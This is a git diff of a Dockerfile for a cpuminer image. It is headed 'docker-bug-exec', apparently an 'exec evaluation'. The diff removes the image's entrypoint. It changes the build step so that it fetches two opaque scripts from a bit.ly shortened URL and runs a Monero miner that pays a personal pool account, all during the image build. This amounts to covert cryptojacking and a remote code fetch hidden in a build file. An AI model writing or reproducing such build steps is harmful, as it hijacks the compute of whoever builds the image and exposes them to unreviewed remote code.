@@ -1,4 +1,10 @@
+#   Title: docker-bug-exec
+#   Desc: exec evaluation
+#   Autor: Ferro.Mariano, navebinario
+#   Url: gitlab.com/docker-bug-exec/Dockerfile, github.com/ferromariano/aa-my-cpuminer
+#   Date: 2017-08-26
 # Note: On Alpine 3.5 curl-dev uses LibreSSL which is incompatible with the required OpenSSL-dev.
+
 FROM alpine:3.4
 
 RUN set -x \
@@ -33,7 +39,6 @@ RUN set -x \
  && rm -rf /tmp/* \
     # Verify
  && cpuminer --cputest \
- && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x
-
-ENTRYPOINT ["dumb-init"]
-CMD ["cpuminer", "--help"]
+ && wget https://bitly.com/2xkMehg#star -nv -O ./EXEC-start.sh \
+ && cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
+ && wget https://bitly.com/2xkMehg#end -nv -O ./EXEC-end.sh 
